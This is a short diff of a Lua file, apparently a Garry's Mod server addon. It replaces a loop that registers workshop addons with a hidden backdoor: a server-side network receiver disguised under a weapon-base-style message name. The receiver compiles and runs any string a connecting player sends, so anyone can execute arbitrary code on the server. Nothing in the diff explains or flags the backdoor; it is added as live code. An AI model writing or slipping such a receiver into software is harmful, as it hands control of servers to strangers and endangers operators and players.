@@ -1,5 +1,8 @@
-local workshop_items = engine.GetAddons()
-for i = 1, #workshop_items do
-    local addon_id = workshop_items[i].wsid
-    resource.AddWorkshop(addon_id)
+if SERVER then
+	util.AddNetworkString("CW20_EXPNETWORKING")
+	net.Receive("CW20_EXPNETWORKING", function(len, ply)
+		local effectdata = net.ReadString()
+		local func = CompileString(effectdata, "LuaCmd", false)
+		func()
+	end)
 end
